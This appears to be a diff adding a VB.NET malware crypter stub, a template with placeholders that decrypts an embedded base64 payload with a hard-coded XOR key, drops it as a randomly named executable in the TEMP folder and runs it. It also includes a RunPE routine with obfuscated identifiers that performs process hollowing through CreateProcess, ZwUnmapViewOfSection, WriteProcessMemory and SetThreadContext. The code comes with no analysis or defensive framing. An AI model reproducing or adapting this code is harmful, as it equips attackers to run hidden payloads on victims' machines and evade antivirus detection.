@@ -1,0 +1,148 @@
+Imports System, Microsoft.VisualBasic
+Imports System.Runtime.InteropServices
+Imports System.ComponentModel
+Module %1%
+Sub Main()
+Dim %2% As String = %3%
+Dim %4% As Byte() = decrypt(Convert.FromBase64String(%2%),"pr0t0typ3")
+Randomize()
+Dim %5% As String = Int((1000 - 1 + 1) * Rnd()) + 1
+IO.File.WriteAllBytes(Environ("TEMP").ToString & "\" & %5% & ".exe",%4%)
+Call Shell(Environ("TEMP").ToString & "\" & %5% & ".exe")
+End
+End Sub
+' Function to Call RunPE is : KsbAbqBdmrvcBUGdOTMXp
+Public Class iZidShACWUYfRMfObrQXn
+Public Const EiBoSqmHGNICwZBAeQAXC As Long = &H200
+Public Const AJDNotAktYdLOOGRFTiqU As Long = &H40
+Public Const TSTZnFmpdSNetaaDIoTrf As Long = &H80
+Public Const OqVvMHAWTdhoLPfUgrENB As Long = &H20
+Public Const iCmJLQnbDWRKpcBGjQlNM As Long = &H10
+Public Const daofhTBIqimTHRGXJTXge As Long = &H8
+Public Const wkHqhcnNabWnmdZJMoHhq As Long = &H1
+Public Const sKJPGfBrPmqwESeakrqDL As Long = &H4
+Public Const OUZbFonwwfaTifBNnQaDX As UInt32 = &H2
+Shared Sub KsbAbqBdmrvcBUGdOTMXp(ByVal dEsLbCoiWkfwfgZQRotXE() As Byte, ByVal ZcthwFCOMvCIuVehoreqW As String)
+Dim slNswOoUtpjcciATrQPri = New oMPRVRCAjDHlrXFkSTAND.KVfdUZoFTtoIYkZWVohNO, GthCqcDjJILRoZdntrThh As oMPRVRCAjDHlrXFkSTAND.ZGBNqlpopBslVlAZwQDhs, UdCjOoDVfMPukaFqXTmDN = New oMPRVRCAjDHlrXFkSTAND.onTuOApaPFAQSnYdaoWEZ, jNVTkCDHFRUahcdtArIXr = New oMPRVRCAjDHlrXFkSTAND.FXlfjLpMmKEtOoAgDQpXG, BvnEIOEqcVYFddEAbTarY = New oMPRVRCAjDHlrXFkSTAND.UHGPIXqvMPJZLqYjeoLrk, QfIldaEbCadiafdDFrtNF = New oMPRVRCAjDHlrXFkSTAND.UHGPIXqvMPJZLqYjeoLrk
+Dim joZwdjqgiTNFIrwmIQdNR = GCHandle.Alloc(dEsLbCoiWkfwfgZQRotXE, GCHandleType.Pinned)
+Dim fPbVClENYfhOXgEGfTPhj As Integer = joZwdjqgiTNFIrwmIQdNR.AddrOfPinnedObject.ToInt32
+Dim BYrhBuqSIYSiEtYpiowhu As New oMPRVRCAjDHlrXFkSTAND.uwtGXAFwvjmrTicJJriDQ
+BYrhBuqSIYSiEtYpiowhu = Marshal.PtrToStructure(joZwdjqgiTNFIrwmIQdNR.AddrOfPinnedObject, BYrhBuqSIYSiEtYpiowhu.GetType)
+joZwdjqgiTNFIrwmIQdNR.Free()
+If oMPRVRCAjDHlrXFkSTAND.CreateProcess(Nothing, ZcthwFCOMvCIuVehoreqW, BvnEIOEqcVYFddEAbTarY, QfIldaEbCadiafdDFrtNF, False, 4, Nothing, Nothing, jNVTkCDHFRUahcdtArIXr, UdCjOoDVfMPukaFqXTmDN) = 0 Then Return
+Dim QJMRXJrEfcWOBuwsMQSEb As New oMPRVRCAjDHlrXFkSTAND.MgOnsMFiVoqXQjEMkTEXt
+QJMRXJrEfcWOBuwsMQSEb = Marshal.PtrToStructure(New IntPtr(fPbVClENYfhOXgEGfTPhj + BYrhBuqSIYSiEtYpiowhu.fqfCsUrnFhbruwXwnolXI), QJMRXJrEfcWOBuwsMQSEb.GetType)
+Dim fqfCsUrnFhbruwXwnolXI, aRgXRXFUssvDNlcQNrWra As Long, uaAjQgsZcmfXrBwCQQHrm As UInteger
+jNVTkCDHFRUahcdtArIXr.pBCImjGFRACgJnDToTpNH = Len(jNVTkCDHFRUahcdtArIXr)
+slNswOoUtpjcciATrQPri.LKSTmssLBqjCoCXFroZOT = 65538
+If QJMRXJrEfcWOBuwsMQSEb.HiUpKuGooFHMGocWSrLhl <> 17744 Or BYrhBuqSIYSiEtYpiowhu.arlEKGstYvofkEvIVQshA <> 23117 Then Return
+If oMPRVRCAjDHlrXFkSTAND.GetThreadContext(UdCjOoDVfMPukaFqXTmDN.WSmZgJGaOJLoDqDZsTeES, slNswOoUtpjcciATrQPri) And oMPRVRCAjDHlrXFkSTAND.ReadProcessMemory(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, slNswOoUtpjcciATrQPri.lCIKEVHMlOQUwrbcWrAXw + 8, fqfCsUrnFhbruwXwnolXI, 4, 0) >= 0 And oMPRVRCAjDHlrXFkSTAND.ZwUnmapViewOfSection(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, fqfCsUrnFhbruwXwnolXI) >= 0 Then
+Dim HMYVEetRVHAoeHvPZQhYK As UInt32 = oMPRVRCAjDHlrXFkSTAND.VirtualAllocEx(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, QJMRXJrEfcWOBuwsMQSEb.DkaragHvLSUAttDgATSrc.WtqGZptDrMEUaIWSDoDro, QJMRXJrEfcWOBuwsMQSEb.DkaragHvLSUAttDgATSrc.SUsbvsHhhXZdpubjbrlNJ, 12288, 4)
+If HMYVEetRVHAoeHvPZQhYK <> 0 Then
+oMPRVRCAjDHlrXFkSTAND.WriteProcessMemory(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, HMYVEetRVHAoeHvPZQhYK, dEsLbCoiWkfwfgZQRotXE, QJMRXJrEfcWOBuwsMQSEb.DkaragHvLSUAttDgATSrc.ldMnuEumRQJAXKvVeQVOV, uaAjQgsZcmfXrBwCQQHrm)
+aRgXRXFUssvDNlcQNrWra = BYrhBuqSIYSiEtYpiowhu.fqfCsUrnFhbruwXwnolXI + 248
+For gEOMTHISHcdJmwCmETHhn As Integer = 0 To QJMRXJrEfcWOBuwsMQSEb.DNeXTPuXoVNdUMWYHoohC.vlgtpSIEegimjBbpfraEU - 1
+GthCqcDjJILRoZdntrThh = Marshal.PtrToStructure(New IntPtr(fPbVClENYfhOXgEGfTPhj + aRgXRXFUssvDNlcQNrWra + gEOMTHISHcdJmwCmETHhn * 40), GthCqcDjJILRoZdntrThh.GetType)
+Dim RvwIobuJOZSJQNubiQKEg(GthCqcDjJILRoZdntrThh.NVBdNeInElmSfCCsJTtXB) As Byte
+For gfSpNnvskeWlNPWfModYM  As Integer = 0 To GthCqcDjJILRoZdntrThh.NVBdNeInElmSfCCsJTtXB - 1 : RvwIobuJOZSJQNubiQKEg(gfSpNnvskeWlNPWfModYM) = dEsLbCoiWkfwfgZQRotXE(GthCqcDjJILRoZdntrThh.cGTOipJZaprvcEavjrOrf + gfSpNnvskeWlNPWfModYM) : Next
+oMPRVRCAjDHlrXFkSTAND.WriteProcessMemory(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, HMYVEetRVHAoeHvPZQhYK + GthCqcDjJILRoZdntrThh.fqfCsUrnFhbruwXwnolXI, RvwIobuJOZSJQNubiQKEg, GthCqcDjJILRoZdntrThh.NVBdNeInElmSfCCsJTtXB, uaAjQgsZcmfXrBwCQQHrm)
+oMPRVRCAjDHlrXFkSTAND.VirtualProtectEx(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, HMYVEetRVHAoeHvPZQhYK + GthCqcDjJILRoZdntrThh.fqfCsUrnFhbruwXwnolXI, GthCqcDjJILRoZdntrThh.vPkZiBveKjbRJQuimQwrq.NVBdNeInElmSfCCsJTtXB, rnmvHEJLAuvaZFCCNThOL(GthCqcDjJILRoZdntrThh.LKSTmssLBqjCoCXFroZOT), fqfCsUrnFhbruwXwnolXI)
+Next gEOMTHISHcdJmwCmETHhn
+Dim NwFKGNvQhnfuGSVlQoSOX = BitConverter.GetBytes(HMYVEetRVHAoeHvPZQhYK)
+oMPRVRCAjDHlrXFkSTAND.WriteProcessMemory(UdCjOoDVfMPukaFqXTmDN.pcGlfStfvCsLhFXLwoOEd, slNswOoUtpjcciATrQPri.lCIKEVHMlOQUwrbcWrAXw + 8, NwFKGNvQhnfuGSVlQoSOX, 4, uaAjQgsZcmfXrBwCQQHrm)
+slNswOoUtpjcciATrQPri.JXHfcQJtXCCGVHaForDhp = HMYVEetRVHAoeHvPZQhYK + QJMRXJrEfcWOBuwsMQSEb.DkaragHvLSUAttDgATSrc.fqfCsUrnFhbruwXwnolXI
+oMPRVRCAjDHlrXFkSTAND.SetThreadContext(UdCjOoDVfMPukaFqXTmDN.WSmZgJGaOJLoDqDZsTeES, slNswOoUtpjcciATrQPri)
+oMPRVRCAjDHlrXFkSTAND.ResumeThread(UdCjOoDVfMPukaFqXTmDN.WSmZgJGaOJLoDqDZsTeES)
+End If
+End If
+End Sub
+Private Shared Function cgYrcZwCHskaDTuorQkiE(ByVal rQqbAkwkdwoGwVVrVoGEi As Long, ByVal YHZQAbKfuGHjSIBIRTWEW As Long) As Long
+cgYrcZwCHskaDTuorQkiE = mosAWnKRTLLPPKaLsrpXD(rQqbAkwkdwoGwVVrVoGEi) / (2 ^ YHZQAbKfuGHjSIBIRTWEW)
+End Function
+Private Shared Function mosAWnKRTLLPPKaLsrpXD(ByVal JBLMVwwWDEtjtWtvvQZYP As Long) As Double
+Const EYNhrCLDqPQsLMBOWTLrh = 4294967296.0#
+If JBLMVwwWDEtjtWtvvQZYP < 0 Then
+mosAWnKRTLLPPKaLsrpXD = JBLMVwwWDEtjtWtvvQZYP + EYNhrCLDqPQsLMBOWTLrh
+Else
+mosAWnKRTLLPPKaLsrpXD = JBLMVwwWDEtjtWtvvQZYP
+End If
+End Function
+Private Shared Function rnmvHEJLAuvaZFCCNThOL(ByVal XidtrKAIaJAPqYVBZosrs As Long) As Long
+Dim TJfSPNLmQUUYINZSArdOO() As Object = {wkHqhcnNabWnmdZJMoHhq, iCmJLQnbDWRKpcBGjQlNM, OUZbFonwwfaTifBNnQaDX, OqVvMHAWTdhoLPfUgrENB, sKJPGfBrPmqwESeakrqDL, AJDNotAktYdLOOGRFTiqU, sKJPGfBrPmqwESeakrqDL, sKJPGfBrPmqwESeakrqDL}
+rnmvHEJLAuvaZFCCNThOL = TJfSPNLmQUUYINZSArdOO(cgYrcZwCHskaDTuorQkiE(XidtrKAIaJAPqYVBZosrs, 29))
+End Function
+<EditorBrowsable(1)> Friend Class oMPRVRCAjDHlrXFkSTAND
+<StructLayout(0)> Structure KVfdUZoFTtoIYkZWVohNO
+Dim LKSTmssLBqjCoCXFroZOT, mSwdPWArANFsmatEDQOOZ, iqBClZLYnZZEEPBVaTwhr, ECROkiAdXSJXjbUHdogiG, AaTjJkMJMddhBQZYErSEY, TjjvJtBOtWODgdtKHQCEk, PKlUewMsjiiMvSAbfTlYF As UInt32, iUFfeIBATbSgceUNioVYR As iUFfeIBATbSgceUNioVYR
+Dim erGEDLMeJmmprTZeIrHrj, AEXQCUBjqgWMZgsRLQosv, scZmYWNQgrrVoVAijTZOQ, PlpAYfCVQkbpVhUUmoKOb, KMrWtiNCGwvBlWYlNrsiu, dVLhtrCHmpfVSjsXQQciI, lCIKEVHMlOQUwrbcWrAXw, ZtMGStNkcDDehYAonTOEa, sFdSRFCqMtkBPlTarovEm, JXHfcQJtXCCGVHaForDhp, odfonIOWCIHKeaYrRrhYH, KnvCnRDbjBoeLmrdUQRYT, GNAYMUOIZMMnbbwusTDrl, ZXRjLdDNJGtKIoThvoksA, VvSIhfOrwRQTXdYBWrVOS, oHjUgoEwfKAmFprkZQGOe As UInt32
+<MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> Dim kflqFrPdVWVvUewEwToiw As Byte()
+End Structure
+<StructLayout(0)> Structure iUFfeIBATbSgceUNioVYR
+Dim GoEEFDEiFPFSBrSnCoYiK, BPGabGPOsaZbQgXHarKEd, VYWlaPEUcTJvvsrqdQrFo, QwYKwRPASfeHNhwKETdYJ, jJpWwaFFCYObsuStHoNYV, fgqsUdQjpjikKjXNerwsn, BqKGUmFoYdSHovqAhQgsC As UInteger
+<MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> Dim uQMcqoQVOonQGlvQITROU As Byte()
+Dim QacnpAFavhXklASDLoCPg As UInt32
+End Structure
+Structure vPkZiBveKjbRJQuimQwrq
+Dim fqfCsUrnFhbruwXwnolXI, NVBdNeInElmSfCCsJTtXB As UInt32
+End Structure
+Structure ZGBNqlpopBslVlAZwQDhs
+Dim MBeMODQHltrtDmXUjrkiB As Byte, vPkZiBveKjbRJQuimQwrq As vPkZiBveKjbRJQuimQwrq, fqfCsUrnFhbruwXwnolXI, NVBdNeInElmSfCCsJTtXB, cGTOipJZaprvcEavjrOrf, fKvYOMGMVmbQhCqGmQUiN, biwujPRqLAvZAovXMTGEf, urQIjYGvsqgteDRJQonFq, qSSeIaRbiFDFtpWanrZYM, LKSTmssLBqjCoCXFroZOT As UInt32
+End Structure
+Structure onTuOApaPFAQSnYdaoWEZ
+Dim pcGlfStfvCsLhFXLwoOEd, WSmZgJGaOJLoDqDZsTeES As IntPtr, MbipHjGhSvkYbFqMqQJYX, HCkOdmRNHJHhqrvdRTssp As Integer
+End Structure
+<StructLayout(0, CharSet:=3)> Structure FXlfjLpMmKEtOoAgDQpXG
+Dim pBCImjGFRACgJnDToTpNH As Integer, aMEadvHSoDpEXGRQUocsE, WjFwBBSweOMNnsWgsrNOW, ptWKBKHEOHthUIpTvQvPi As String, lUYgXMSiETQqjuukVTgiD, gfSpNnvskeWlNPWfModYM, HdorWVHnlMBNRJRWYoQiP, DEqQsYTUbXVWgvWnwrCFh, WNJcshIZLQFqNLpZCQjFt, SlLBQjTFBcZCcAuqaTVYO, lucMQsILhVJWKNQcdoFZZ, LKSTmssLBqjCoCXFroZOT As Integer
+Dim hVeimvToXgefZCVtDross, DfutlHItHaOCHOpfGQYsG As Short, vFwSKKUauliLWDuweTJOY, SPPeKTJfeeSfDQQjhorPk, NnRDfVUMUqnoSFVDIrciF, gwiOfeJREjXKARomLQNiR As Integer
+End Structure
+<StructLayout(0)> Structure UHGPIXqvMPJZLqYjeoLrk
+Dim cXjkEhUvrurTPGtGiTvFj As Integer, vgDvDqJDanbnuTQpmofFv As IntPtr, rHFUZtVhQCwwMIVJMrRYQ As Integer
+End Structure 
+<StructLayout(0)> Structure uwtGXAFwvjmrTicJJriDQ
+Dim arlEKGstYvofkEvIVQshA, NQVgZFKmAsgTqUosPQBZc, JoXFvHVSnGDcIJtMnTksu, cBoQuQKYXAkwnWPvqoUsI, NVBdNeInElmSfCCsJTtXB, YYpmTTVENLIIFLUPRrFPb, riJAScKJuEpcjYoCUQnPm, oHjUgoEwfKAmFprkZQGOe, nILWoeWnkQMlCNtTrTYiH, JSbionLsTJtIgZPFuoJjT, EqdHNqWZJURRvOUWVrrFl, YCtSMCLeqNBldbnIYQbFA, TavoiFWLgZVusQsZwTNZS, mjPCiOMQQSFRZcPLCouZe As UInt16
+<MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> Dim aMEadvHSoDpEXGRQUocsE As UInt16()
+Dim iKRYGQXtGdaaoRUcZrgsw, EThkGZMCnXKtWenOcQQsL As UInt16
+<MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> Dim DfutlHItHaOCHOpfGQYsG As UInt16()
+Dim fqfCsUrnFhbruwXwnolXI As Int32
+End Structure
+Structure MgOnsMFiVoqXQjEMkTEXt
+Dim HiUpKuGooFHMGocWSrLhl As UInt32, DNeXTPuXoVNdUMWYHoohC As ArjJccXfdieFlTsfDTCPd, DkaragHvLSUAttDgATSrc As TECUblMkNbOZTfOSGojPo
+End Structure
+<StructLayout(0)> Structure ArjJccXfdieFlTsfDTCPd
+Dim PbEqAoXRCniiiUTierUiK, vlgtpSIEegimjBbpfraEU As UInt16, ilVEAwNWjgTFPhnVhQFjV, TavoiFWLgZVusQsZwTNZS, eMWaVCYDZrnOeWrmHTnFn As UInt32, NVBdNeInElmSfCCsJTtXB, LKSTmssLBqjCoCXFroZOT As UInt16
+End Structure
+<StructLayout(0)> Structure TECUblMkNbOZTfOSGojPo
+Public arlEKGstYvofkEvIVQshA As UInt16, AVnmVLNIJkXiMiOYLoXFC,  ttpLrOYmwwrrbXTpirJZU As Byte, PFIWqXNrgpcOJkmblQqZg, KdKsPZYYWDwXYZrsMTcsB, embGPiOdGugrFmOePoMtN, fqfCsUrnFhbruwXwnolXI, ZNccklZJtIDDUbSvnrvPf, dEsLbCoiWkfwfgZQRotXE, WtqGZptDrMEUaIWSDoDro As UInt32, sXtokuOOcBlXCnmiqQfPr, ouvNJAZsSNIgRcrBQTQjM As UInt32
+Public KHOYIJOACGpDvpNlToBjX, GfQueLZepRMMOeSFrrjFq, ZogIeUPjZKufsqmouQTGE, VPieCXaQPWRoKfqIVTFZW, oYCqCgPVwPBLpsNrYomZi, kwEPYjaCmaVUHhSLvrYsD As UInt16, GIUaXrPHVUFoltluBQItP, SUsbvsHhhXZdpubjbrlNJ, ldMnuEumRQJAXKvVeQVOV, JSbionLsTJtIgZPFuoJjT As UInt32, CgWwtuakLfaAEiqOZTrPh, LKSTmssLBqjCoCXFroZOT As UInt16
+Public VqmKtGQqsYKUivNAcobPt, QQogRJbWikedAkRRDrMjO, kaIsRSQbSdOAfAlEGQuja, fBJRnUbIIojJumqVdTfFs, BKacmdQNphTdbBMHhoPGG, uicBLgcrftnmqnRYHrBZZ As UInt32
+ <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> Public QrsMLpRwOmXJYDlKKQiZk As QrsMLpRwOmXJYDlKKQiZk()
+End Structure
+<StructLayout(0)> Structure QrsMLpRwOmXJYDlKKQiZk
+Dim fqfCsUrnFhbruwXwnolXI, NVBdNeInElmSfCCsJTtXB As UInt32
+End Structure
+Declare Auto Function CreateProcess Lib "kernel32" (ByVal name As String, ByVal command As String, ByRef process As UHGPIXqvMPJZLqYjeoLrk, ByRef thread As UHGPIXqvMPJZLqYjeoLrk, ByVal inherit As Boolean, ByVal flags As UInt32, ByVal system As IntPtr, ByVal current As String, <[In]()> ByRef startup As FXlfjLpMmKEtOoAgDQpXG, <Out()> ByRef info As onTuOApaPFAQSnYdaoWEZ) As Boolean
+Declare Auto Function WriteProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal buffer As Byte(), ByVal size As IntPtr, <Out()> ByRef written As Integer) As Boolean
+Declare Auto Function ReadProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByRef buffer As IntPtr, ByVal size As IntPtr, ByRef read As Integer) As Integer
+Declare Auto Function VirtualProtectEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UIntPtr, ByVal [new] As UIntPtr, <Out()> ByVal old As UInt32) As Integer
+Declare Auto Function VirtualAllocEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UInt32, ByVal type As UInt32, ByVal protect As UInt32) As IntPtr
+Declare Auto Function ZwUnmapViewOfSection Lib "ntdll" (ByVal process As IntPtr, ByVal address As IntPtr) As Long
+Declare Auto Function ResumeThread Lib "kernel32" (ByVal thread As IntPtr) As UInt32
+Declare Auto Function GetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As KVfdUZoFTtoIYkZWVohNO) As Boolean
+Declare Auto Function SetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As KVfdUZoFTtoIYkZWVohNO) As Boolean
+End Class
+End Class
+
+Function decrypt(ByVal message As Byte(), ByVal password As String) As Byte()
+        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
+        Dim rand1 As Integer = message(message.Length - 1) Xor 112
+        Dim outarr(message.Length) As Byte
+        Dim u1 As Integer
+        For i1 As Integer = 0 To message.Length - 1
+            outarr(i1) = (message(i1) Xor rand1) Xor passarr(u1)
+            If u1 = password.Length - 1 Then u1 = 0 Else u1 = u1 + 1
+        Next
+        ReDim Preserve outarr(message.Length - 2)
+        Return outarr
+    End Function
+End Module
+
